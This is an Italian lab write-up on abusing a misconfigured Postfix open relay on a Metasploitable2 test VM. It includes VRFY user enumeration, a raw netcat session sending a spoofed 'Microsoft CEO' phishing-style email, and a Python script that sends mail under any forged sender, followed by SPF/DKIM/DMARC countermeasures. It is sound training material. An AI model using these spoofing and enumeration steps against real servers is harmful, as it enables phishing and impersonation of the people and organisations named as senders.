# Lab 10 — SMTP Open Relay

## Obiettivo
Sfruttare un server SMTP mal configurato come open relay per inviare email con mittente arbitrario, comprendendo le basi del email spoofing.

## Ambiente
| VM | IP | Ruolo |
|---|---|---|
| Kali Linux | 10.0.2.6 | Attaccante |
| Metasploitable2 | 10.0.2.5 | Target (Postfix open relay) |

## Tool utilizzati
- `netcat` / `telnet` — connessione SMTP raw
- `nmap` — rilevamento servizio SMTP
- `smtp-user-enum` — enumerazione utenti
- `python3` (smtplib) — automazione

## Ricognizione SMTP
```bash
nmap -sV -p 25 10.0.2.5
# -> 25/tcp open smtp Postfix smtpd

smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t 10.0.2.5

nc 10.0.2.5 25
VRFY root
VRFY msfadmin
VRFY sys
QUIT
```

## Email manuale via netcat
```bash
nc 10.0.2.5 25
EHLO kali
MAIL FROM:<ceo@microsoft.com>
RCPT TO:<root>
DATA
Subject: Aggiornamento urgente
From: ceo@microsoft.com
To: root

Clicca sul link per aggiornare le credenziali.
.
QUIT
```

## Script Python — mail_meta.py
```python
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

def send_open_relay_email():
    target_ip   = "10.0.2.5"
    target_port = 25

    sender   = input("From (mittente falso): ")
    receiver = input("To (utente su Metasploitable): ")
    subject  = input("Subject: ")
    body     = input("Messaggio: ")

    msg = MIMEMultipart()
    msg['From']    = sender
    msg['To']      = receiver
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    try:
        server = smtplib.SMTP(target_ip, target_port)
        server.sendmail(sender, [receiver], msg.as_string())
        print(f"[+] Email inviata a {receiver} come {sender}")
        server.quit()
    except Exception as e:
        print(f"[-] Errore: {e}")

if __name__ == "__main__":
    send_open_relay_email()
```

## Verifica ricezione su Metasploitable
```bash
ssh msfadmin@10.0.2.5
cat /var/mail/root
ls /var/mail/
```

## Perché è pericoloso
| Rischio | Descrizione |
|---|---|
| Email spoofing | Mittente completamente falsificabile |
| Phishing | Base per attacchi social engineering credibili |
| Spam relay | Server usato per spam massivo |
| Blacklist IP | IP del server finisce in blacklist globali |

## Contromisure
- **SPF** — record DNS che dichiara quali IP possono inviare per il dominio
- **DKIM** — firma crittografica del messaggio
- **DMARC** — policy che combina SPF + DKIM
- **SMTP AUTH** — richiede autenticazione per inviare
- **STARTTLS** — cifra il canale SMTP

## Risultati
- Email inviata con mittente falso senza autenticazione
- VRFY confermato: root, msfadmin, sys esistono sul sistema
- Email ricevuta nella mailbox di root su Metasploitable

## Concetti chiave
- SMTP non prevede autenticazione nativa — va configurata
- Senza SPF/DKIM/DMARC il mittente è una bugia che chiunque può scrivere
- Metasploitable ha Postfix configurato come open relay di proposito
